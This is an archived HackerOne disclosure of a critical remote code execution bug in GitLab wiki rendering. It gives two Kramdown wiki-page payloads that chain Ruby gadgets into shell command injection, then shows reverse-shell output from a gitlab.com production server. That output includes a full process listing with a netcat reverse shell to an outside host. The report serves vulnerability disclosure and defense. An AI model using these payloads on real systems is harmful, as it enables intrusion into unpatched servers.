---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Code Injection"
enriched: true
date: 2021-04-20
submitted: 2021-03-14T13:38:23.678Z
bounty_usd: 20000
votes: 427
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/1125425"
title: "RCE via unsafe inline Kramdown options when rendering certain Wiki pages"
---
# RCE via unsafe inline Kramdown options when rendering certain Wiki pages

> **Severity:** Critical | **Bounty:** 20,000 USD | **Votes:** 427 | **Program:** GitLab | **Disclosed:** 2021-04-20

- Report: [https://hackerone.com/reports/1125425](https://hackerone.com/reports/1125425)
- CWE: Code Injection
- Submitted: 2021-03-14T13:38:23.678Z

## Timeline

- **Report Filed**
- **2021-03-14** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **Report Triaged**
- **Bounty Awarded**
- **2021-03-14** @vakzz: Hi @dcouture,

> Are you aware of ways to predict the path of an uploaded file on a GitLab install that uses external object storage?

I've never used external object store before so will have to set it up and have a look around tomorrow night. Are the git repositories stored on the filesystem even when external object storage is being used?

There are a few other classes that can be created that seem dangerous such as setting the `cluster` value on `Redis.new`, as well as the Carrierwave helper methods like `remote_avatar_url` on `User.new`. The list of classes is long so will take a while to go through and see if any others are exploitable as well

Cheers,
Will
- **2021-03-14** @dcouture: Hi @vakzz,

`git` repositories are stored on disk but on other hosts that shouldn't be visible from where the wiki is rendered. I was mainly trying to figure out if this affected .com, at the moment we think it doesn't (still a critical vulnerability!) but we'll keep investigating.

Thanks again,
Dominic
GitLab Security Team
- **2021-03-15** @vakzz: Hi @dcouture,

I've managed to chain another gadget that allows for RCE without needing to know a file location.

First create a page `load1.rmd` that uses the original redis driver gadget to load the `get_process_mem` gem:

```
{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../get_process_mem\}" /}

~~ ruby
    def what?
      42
    end
~~
```

Then create another page `load2.rmd` using the `GetProcessMem` class: 
```
{::options syntax_highlighter="rouge" syntax_highlighter_opts="{a: '`echo inject > /tmp/inject`', formatter: GetProcessMem\}" /}

~~ ruby
    def what?
      42
    end
~~
```

This will end up calling [`ps_memory`](https://github.com/schneems/get_process_mem/blob/v0.2.5/lib/get_process_mem.rb#L116) which does the following where `pid` is our options hash:
```ruby
mem = `ps -o rss= -p #{pid}`
```

The hash is converted to a string which allows for trivial command injection in the backticks. Checking on gitlab.com I was able to get a remote shell on `web-30-sv-gprd`:

```
Connection from [34.74.90.72] port 12345 [tcp/*] accepted (family 2, sport 7281)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=500(git) gid=500(git) groups=500(git)
$ hostname -a
web-30-sv-gprd
$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 185344  5912 ?        Ss   Jan27   3:42 /sbin/init
root         2  0.0  0.0      0     0 ?        S    Jan27   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   Jan27   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    Jan27   1:58 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    Jan27  51:24 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    Jan27   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/0]
root        11  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/1]
root        16  0.0  0.0      0     0 ?        S    Jan27   1:46 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/2]
root        20  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/2]
root        21  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/2]
root        22  0.0  0.0      0     0 ?        S    Jan27   1:42 [ksoftirqd/2]
root        24  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/2:0H]
root        25  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/3]
root        26  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/3]
root        27  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/3]
root        28  0.0  0.0      0     0 ?        S    Jan27   1:36 [ksoftirqd/3]
root        30  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/3:0H]
root        31  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/4]
root        32  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/4]
root        33  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/4]
root        34  0.0  0.0      0     0 ?        S    Jan27   1:38 [ksoftirqd/4]
root        36  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/4:0H]
root        37  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/5]
root        38  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/5]
root        39  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/5]
root        40  0.0  0.0      0     0 ?        S    Jan27   1:33 [ksoftirqd/5]
root        42  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/5:0H]
root        43  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/6]
root        44  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/6]
root        45  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/6]
root        46  0.0  0.0      0     0 ?        S    Jan27   1:34 [ksoftirqd/6]
root        48  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/6:0H]
root        49  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/7]
root        50  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/7]
root        51  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/7]
root        52  0.0  0.0      0     0 ?        S    Jan27   1:34 [ksoftirqd/7]
root        54  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/7:0H]
root        55  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/8]
root        56  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/8]
root        57  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/8]
root        58  0.0  0.0      0     0 ?        S    Jan27   1:30 [ksoftirqd/8]
root        60  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/8:0H]
root        61  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/9]
root        62  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/9]
root        63  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/9]
root        64  0.0  0.0      0     0 ?        S    Jan27   1:33 [ksoftirqd/9]
root        66  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/9:0H]
root        67  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/10]
root        68  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/10]
root        69  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/10]
root        70  0.0  0.0      0     0 ?        S    Jan27   1:31 [ksoftirqd/10]
root        72  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/10:0H]
root        73  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/11]
root        74  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/11]
root        75  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/11]
root        76  0.0  0.0      0     0 ?        S    Jan27   1:32 [ksoftirqd/11]
root        78  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/11:0H]
root        79  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/12]
root        80  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/12]
root        81  0.0  0.0      0     0 ?        S    Jan27   0:08 [migration/12]
root        82  0.0  0.0      0     0 ?        S    Jan27   1:39 [ksoftirqd/12]
root        84  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/12:0H]
root        85  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/13]
root        86  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/13]
root        87  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/13]
root        88  0.0  0.0      0     0 ?        S    Jan27   1:30 [ksoftirqd/13]
root        90  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/13:0H]
root        91  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/14]
root        92  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/14]
root        93  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/14]
root        94  0.0  0.0      0     0 ?        S    Jan27   1:31 [ksoftirqd/14]
root        96  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/14:0H]
root        97  0.0  0.0      0     0 ?        S    Jan27   0:00 [cpuhp/15]
root        98  0.0  0.0      0     0 ?        S    Jan27   0:05 [watchdog/15]
root        99  0.0  0.0      0     0 ?        S    Jan27   0:09 [migration/15]
root       100  0.0  0.0      0     0 ?        S    Jan27   1:33 [ksoftirqd/15]
root       102  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/15:0H]
root       103  0.0  0.0      0     0 ?        S    Jan27   0:00 [kdevtmpfs]
root       104  0.0  0.0      0     0 ?        I<   Jan27   0:00 [netns]
root       105  0.0  0.0      0     0 ?        S    Jan27   0:00 [rcu_tasks_kthre]
root       106  0.0  0.0      0     0 ?        S    Jan27   0:00 [kauditd]
root       109  0.0  0.0      0     0 ?        S    Jan27   0:03 [khungtaskd]
root       110  0.0  0.0      0     0 ?        S    Jan27   0:00 [oom_reaper]
root       111  0.0  0.0      0     0 ?        I<   Jan27   0:00 [writeback]
root       112  0.0  0.0      0     0 ?        S    Jan27   0:00 [kcompactd0]
root       113  0.0  0.0      0     0 ?        SN   Jan27   0:00 [ksmd]
root       114  0.0  0.0      0     0 ?        SN   Jan27   0:19 [khugepaged]
root       115  0.0  0.0      0     0 ?        I<   Jan27   0:00 [crypto]
root       116  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kintegrityd]
root       117  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kblockd]
root       118  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ata_sff]
root       119  0.0  0.0      0     0 ?        I<   Jan27   0:00 [md]
root       120  0.0  0.0      0     0 ?        I<   Jan27   0:00 [edac-poller]
root       121  0.0  0.0      0     0 ?        I<   Jan27   0:00 [devfreq_wq]
root       122  0.0  0.0      0     0 ?        I<   Jan27   0:00 [watchdogd]
root       125  0.0  0.0      0     0 ?        S    Jan27   0:00 [kswapd0]
root       126  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kworker/u33:0]
root       127  0.0  0.0      0     0 ?        S    Jan27   0:00 [ecryptfs-kthrea]
root       170  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kthrotld]
root       171  0.0  0.0      0     0 ?        I<   Jan27   0:00 [acpi_thermal_pm]
root       172  0.0  0.0      0     0 ?        S    Jan27   0:00 [scsi_eh_0]
root       173  0.0  0.0      0     0 ?        I<   Jan27   0:00 [scsi_tmf_0]
root       181  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ipv6_addrconf]
root       192  0.0  0.0      0     0 ?        I<   Jan27   0:00 [kstrp]
root       219  0.0  0.0      0     0 ?        I<   Jan27   0:00 [charger_manager]
root       414  0.0  0.0      0     0 ?        I<   Jan27   0:00 [raid5wq]
root       462  0.0  0.0      0     0 ?        S    Jan27   1:00 [jbd2/sda1-8]
root       463  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ext4-rsv-conver]
git        533 12.4  1.9 3034052 1261696 ?     Sl   02:33   5:00 puma: cluster worker 9: 4388 [gitlab-puma-worker]
root       545  0.0  0.0      0     0 ?        I<   Jan27   1:11 [kworker/12:1H]
root       547  0.0  0.0  44648 12148 ?        Ss   Jan27  14:25 /lib/systemd/systemd-journald
root       550  0.0  0.0      0     0 ?        I<   Jan27   0:00 [iscsi_eh]
root       551  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ib-comp-wq]
root       552  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ib-comp-unb-wq]
root       553  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ib_mcast]
root       554  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ib_nl_sa_wq]
root       555  0.0  0.0      0     0 ?        I<   Jan27   0:00 [rdma_cm]
root       572  0.0  0.0 102968  1552 ?        Ss   Jan27   0:00 /sbin/lvmetad -f
root       592  0.0  0.0      0     0 ?        I<   Jan27   0:01 [kworker/7:1H]
root       596  0.0  0.0  42628  3976 ?        Ss   Jan27   0:16 /lib/systemd/systemd-udevd
root       614  0.0  0.0   4392  1164 ?        Ss   Jan27   0:19 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................
root       676  0.0  0.0   4240  1196 ?        Ss   Jan27   0:00 runsv puma
root       686  0.0  0.0   4384  1204 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab/puma
root       694  0.0  0.0   4240  1132 ?        Ss   Jan27   0:00 runsv gitlab-workhorse
root       737  0.2  0.0   4384  1288 ?        S    Jan27 147:53 svlogd /var/log/gitlab/gitlab-workhorse
root       758  0.0  0.0   4240   648 ?        Ss   Jan27   0:00 runsv nginx
root       776  0.0  0.0      0     0 ?        S    Jan27   0:00 [hwrng]
root       791  0.0  0.0   4384  1292 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab/nginx
root       797  0.0  0.0   4240  1096 ?        Ss   Jan27   0:00 runsv logrotate
root       828  0.0  0.0   4384   708 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab/logrotate
root      1017  0.0  0.0      0     0 ?        I<   Jan27   0:06 [kworker/13:1H]
root      1024  0.0  0.0      0     0 ?        I<   Jan27   0:02 [kworker/0:1H]
git       1117 13.8  1.8 2974232 1248464 ?     Sl   02:34   5:26 puma: cluster worker 2: 4388 [gitlab-puma-worker]
root      1302  0.0  0.0  16120  2896 ?        Ss   Jan27   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens4.pid -lf /var/lib/dhcp/dhclient.ens4.leases -I -df /var/lib/dhcp/dhclient6.ens4.leases ens4
root      1456  0.0  0.0      0     0 ?        I<   Jan27   0:01 [kworker/9:1H]
root      1467  0.0  0.0      0     0 ?        I<   Jan27   0:03 [kworker/14:1H]
root      1511  0.0  0.0   5220   152 ?        Ss   Jan27   0:51 /sbin/iscsid
root      1513  0.0  0.0   5720  3516 ?        S<Ls Jan27   4:05 /sbin/iscsid
message+  1524  0.0  0.0  43036  3976 ?        Ss   Jan27   0:13 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1580  0.0  0.0   4396  1292 ?        Ss   Jan27   0:00 /usr/sbin/acpid
daemon    1607  0.0  0.0  26044  2264 ?        Ss   Jan27   0:00 /usr/sbin/atd -f
root      1614  0.0  0.0  28620  3056 ?        Ss   Jan27   0:06 /lib/systemd/systemd-logind
git       1655 13.0  1.8 2988308 1217772 ?     Sl   02:35   4:59 puma: cluster worker 15: 4388 [gitlab-puma-worker]
root      1663  0.0  0.0 308784  1508 ?        Ssl  Jan27   0:24 /usr/bin/lxcfs /var/lib/lxcfs/
root      1709  0.0  0.0 274224  7116 ?        Ssl  Jan27   0:34 /usr/lib/accountsservice/accounts-daemon
root      1714  0.0  0.0  26068  2628 ?        Ss   Jan27   0:26 /usr/sbin/cron -f
root      1786  0.0  0.0 171716 19388 ?        Ssl  Jan27   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1791  0.0  0.0 277180  5984 ?        Ssl  Jan27   0:03 /usr/lib/policykit-1/polkitd --no-debug
root      1793  0.0  0.0      0     0 ?        I<   Jan27   0:02 [kworker/3:1H]
root      1803  0.0  0.0      0     0 ?        I<   Jan27   0:01 [kworker/11:1H]
root      1808  0.0  0.0  13372   160 ?        Ss   Jan27   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1879  0.0  0.0  14656  1788 tty1     Ss+  Jan27   0:00 /sbin/agetty --noclear tty1 linux
root      1880  0.0  0.0  12840  1708 ttyS0    Ss+  Jan27   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
ntp       1894  0.0  0.0  40268  4900 ?        Ss   Jan27   2:27 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116
root      2144  0.0  0.0  65792 21960 ?        Ss   Jan27   2:25 /usr/bin/python3 /usr/bin/google_network_daemon
root      2150  0.0  0.0  65508 21712 ?        Ss   Jan27   1:24 /usr/bin/python3 /usr/bin/google_clock_skew_daemon
root      2274  0.0  0.0      0     0 ?        I<   Jan27   0:02 [kworker/15:1H]
git       2339 14.1  1.8 3333652 1248564 ?     Sl   02:36   5:16 puma: cluster worker 6: 4388 [gitlab-puma-worker]
root      2450  0.0  0.0      0     0 ?        S    Jan27   1:24 [jbd2/sdb-8]
root      2451  0.0  0.0      0     0 ?        I<   Jan27   0:00 [ext4-rsv-conver]
root      2573  0.0  0.0      0     0 ?        I<   Jan27   0:02 [kworker/4:1H]
root      2574  0.0  0.0      0     0 ?        I<   Jan27   0:02 [kworker/1:1H]
root      2575  0.0  0.0      0     0 ?        I<   Jan27   0:02 [kworker/2:1H]
git       2920 11.7  1.9 3120404 1266512 ?     Sl   02:37   4:15 puma: cluster worker 13: 4388 [gitlab-puma-worker]
root      2968  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/8:1]
root      2984  0.1  0.0      0     0 ?        I    01:09   0:08 [kworker/u32:2]
root      3207  0.0  0.0      0     0 ?        I    02:38   0:00 [kworker/7:1]
syslog    3208  0.0  0.0 256392  3108 ?        Ssl  02:38   0:00 /usr/sbin/rsyslogd -n
root      3221  0.0  0.0      0     0 ?        I    02:38   0:00 [kworker/9:0]
root      3532  0.1  0.0      0     0 ?        I    01:58   0:04 [kworker/u32:5]
root      3553  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/13:1]
root      3575  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/0:2]
git       3597 12.7  1.9 2966296 1284300 ?     Sl   02:38   4:30 puma: cluster worker 1: 4388 [gitlab-puma-worker]
git       3852  6.9  0.1 1902584 127192 ?      Ssl  Mar12 214:31 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml
root      4209  0.0  0.0      0     0 ?        I    01:58   0:00 [kworker/5:1]
root      4250  0.0  0.0      0     0 ?        I<   Jan27   0:01 [kworker/5:1H]
root      4251  0.0  0.0      0     0 ?        I<   Jan27   0:01 [kworker/6:1H]
root      4252  0.0  0.0      0     0 ?        I<   Jan27   0:01 [kworker/8:1H]
root      4253  0.0  0.0      0     0 ?        I<   Jan27   0:01 [kworker/10:1H]
git       4328 11.9  1.8 2662164 1217036 ?     Sl   02:40   4:05 puma: cluster worker 10: 4388 [gitlab-puma-worker]
git       4388 13.7  1.5 2173176 990144 ?      Ssl  Mar12 421:55 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]
root      4433  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/12:2]
git       4657 12.1  2.0 2971436 1326468 ?     Sl   02:40   4:03 puma: cluster worker 11: 4388 [gitlab-puma-worker]
root      5132  0.0  0.0  54640  7084 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx
gitlab-+  5133  0.0  0.0  59372 12708 ?        S    Mar08   3:52 nginx: worker process
gitlab-+  5134  0.0  0.0  59364 12744 ?        S    Mar08   3:53 nginx: worker process
gitlab-+  5135  0.0  0.0  59460 12616 ?        S    Mar08   3:56 nginx: worker process
gitlab-+  5136  0.0  0.0  59356 12528 ?        S    Mar08   3:56 nginx: worker process
gitlab-+  5137  0.0  0.0  59452 12916 ?        S    Mar08   5:21 nginx: worker process
gitlab-+  5138  0.0  0.0  59376 12500 ?        S    Mar08   4:05 nginx: worker process
gitlab-+  5139  0.0  0.0  59376 12508 ?        S    Mar08   4:08 nginx: worker process
gitlab-+  5140  0.0  0.0  59356 12532 ?        S    Mar08   4:16 nginx: worker process
gitlab-+  5141  0.0  0.0  59608 13036 ?        S    Mar08   4:31 nginx: worker process
gitlab-+  5142  0.0  0.0  59464 13140 ?        S    Mar08   4:52 nginx: worker process
gitlab-+  5143  0.0  0.0  59448 12488 ?        S    Mar08   4:04 nginx: worker process
gitlab-+  5144  0.0  0.0  59840 13304 ?        S    Mar08   6:28 nginx: worker process
gitlab-+  5145  0.1  0.0  60000 13540 ?        S    Mar08  12:20 nginx: worker process
gitlab-+  5146  0.5  0.0  60404 14200 ?        S    Mar08  58:17 nginx: worker process
gitlab-+  5147  3.7  0.0  60508 14364 ?        S    Mar08 383:48 nginx: worker process
gitlab-+  5148  1.5  0.0  60488 14396 ?        S    Mar08 152:35 nginx: worker process
gitlab-+  5149  0.0  0.0  54836  3644 ?        S    Mar08   0:01 nginx: cache manager process
git       5237 13.9  2.0 3236184 1382204 ?     Sl   02:41   4:31 puma: cluster worker 8: 4388 [gitlab-puma-worker]
consul    5596  0.6  0.1 187780 105132 ?       Ssl  Jan27 448:43 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d
git       5754 13.6  1.8 3183656 1250996 ?     Sl   02:42   4:16 puma: cluster worker 4: 4388 [gitlab-puma-worker]
git       6311 14.3  1.8 2870036 1198324 ?     Sl   02:43   4:21 puma: cluster worker 7: 4388 [gitlab-puma-worker]
git       6835 13.2  1.8 2946584 1217544 ?     Sl   02:44   3:53 puma: cluster worker 3: 4388 [gitlab-puma-worker]
root      7159  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/13:2]
root      7277  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/12:0]
git       7412 13.8  1.8 2920472 1219500 ?     Sl   02:45   3:55 puma: cluster worker 12: 4388 [gitlab-puma-worker]
root      7846  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/15:2]
git       8032 11.8  1.8 2952984 1211404 ?     Sl   02:46   3:14 puma: cluster worker 5: 4388 [gitlab-puma-worker]
root      8082  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/4:0]
root      8149  0.0  0.0  12204  4804 ?        Ss   Jan27  59:20 /usr/sbin/haveged --Foreground --verbose=1 -w 1024
root      8862  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/14:1]
root      9722  0.0  0.0      0     0 ?        I    01:23   0:00 [kworker/11:0]
root      9728  0.0  0.0      0     0 ?        I    01:23   0:00 [kworker/9:1]
root      9729  0.0  0.0      0     0 ?        I    01:23   0:00 [kworker/10:2]
root     13276  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/15:0]
root     14483  0.0  0.0      0     0 ?        I    01:26   0:00 [kworker/6:2]
root     16066  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/2:2]
root     17276  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/3:0]
root     18553  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/4:1]
root     18845  0.1  0.0      0     0 ?        I    02:19   0:04 [kworker/u32:3]
root     19737  0.0  0.0      0     0 ?        I<   Feb02   0:00 [xfsalloc]
root     19739  0.0  0.0      0     0 ?        I<   Feb02   0:00 [xfs_mru_cache]
root     20625  0.0  0.0      0     0 ?        I    03:03   0:00 [kworker/5:2]
root     21604  1.0  0.0 1814880 37204 ?       Ssl  Jan29 656:13 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false
root     23605  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/14:2]
root     23944  0.0  0.0 293416 59540 ?        Sl   Mar10   0:57 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid
root     23949 17.1  0.5 2751768 365428 ?      Sl   Mar10 1119:54 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor
root     24722  0.1  0.0      0     0 ?        I    03:05   0:00 [kworker/u32:4]
root     25266  0.0  0.0   4392  1136 ?        Ss   Jan27   0:59 runsvdir -P /etc/service log: /process HTTP/1.1" 200 153 - -> /process 10.219.1.9 - - [15/Mar/2021:03:13:46 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.10 - - [15/Mar/2021:03:13:59 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.9 - - [15/Mar/2021:03:14:01 UTC] "GET /process HTTP/1.1" 200 153 - -> /process 10.219.1.10 - - [15/Mar/2021:03:14:14 UTC] "GET /process HTTP/1.1" 200 153 - -> /process
root     25356  0.0  0.0   4240   696 ?        Ss   Jan27   0:00 runsv node_exporter
root     25378  0.0  0.0   4384   656 ?        S    Jan27   0:00 svlogd -tt /var/log/prometheus/node_exporter
root     25990  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/1:2]
root     26003  0.0  0.0      0     0 ?        I    Mar14   0:00 [kworker/0:1]
root     26122  0.0  0.0      0     0 ?        I    03:08   0:00 [kworker/11:1]
root     26128  0.0  0.0      0     0 ?        I    03:08   0:00 [kworker/1:0]
root     26445  0.0  0.0   4504   784 ?        Ss   03:08   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper
root     26449  0.0  0.0   4376   648 ?        S    03:08   0:00 sleep 600
root     26906  0.0  0.0   4240  1100 ?        Ss   Jan27   0:31 runsv ntpd_metrics
root     26919  0.0  0.0   4384   652 ?        S    Jan27   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics
root     26926  0.0  0.0   4240  1100 ?        Ss   Jan27   0:03 runsv apt_metrics
root     26948  0.0  0.0   4384   664 ?        S    Jan27   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics
root     27112  0.0  0.0   4240   804 ?        Ss   Jan27   0:00 runsv mtail
root     27132  0.0  0.0   4384   680 ?        S    Jan27   0:00 svlogd -tt /var/log/mtail
gitlab-+ 27233  0.0  0.0 686776 26796 ?        Sl   Feb17  16:48 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml
root     27342  0.0  0.0   4376   700 ?        S    03:10   0:00 sleep 600
root     27352  0.0  0.0      0     0 ?        I    00:11   0:00 [kworker/2:0]
root     27459  0.0  0.0      0     0 ?        I    00:11   0:00 [kworker/8:2]
root     27669  0.1  0.0      0     0 ?        I    03:11   0:00 [kworker/u32:1]
postfix  28015  0.0  0.0  67476  4560 ?        S    01:47   0:00 pickup -l -t fifo -u
root     28031  0.0  0.0      0     0 ?        I    02:29   0:00 [kworker/6:1]
root     28043  0.0  0.0      0     0 ?        I    02:29   0:00 [kworker/10:1]
git      28705  0.0  0.0  30496  2732 ?        S    03:13   0:00 cat /tmp/f
git      28706  0.0  0.0  30604  3632 ?        S    03:13   0:00 /bin/sh -i
git      28707  0.0  0.0  39476  3924 ?        S    03:13   0:00 nc aw.rs 12345
git      28735  0.0  0.0  30496  2688 ?        S    03:13   0:00 cat /tmp/f
git      28736  0.0  0.0  30604  2712 ?        S    03:13   0:00 /bin/sh -i
git      28737  0.0  0.0  39476  4004 ?        S    03:13   0:00 nc aw.rs 12345
root     28752  0.0  0.0   4240   640 ?        Ss   Jan27   0:00 runsv gitlab-monitor
root     28762  0.0  0.0   4384   676 ?        S    Jan27   0:00 svlogd -tt /var/log/gitlab-monitor
root     28765  0.0  0.0   4376   668 ?        S    03:13   0:00 sleep 60
git      29031  0.0  0.0  56028  4744 ?        R    03:14   0:00 ps auxww
root     29086  0.0  0.0 159732 54544 ?        Ssl  Jan27   0:06 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300
root     29231  0.0  0.0  65408  4552 ?        Ss   Jan27   0:07 /usr/lib/postfix/sbin/master
postfix  29236  0.0  0.0  67524  4544 ?        S    Jan27   0:01 qmgr -l -t fifo -u
root     29428  0.0  0.0  65512  6264 ?        Ss   Jan27   0:00 /usr/sbin/sshd -D
root     29451  0.0  0.1 1571212 110120 ?      Ssl  Jan27  42:55 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml
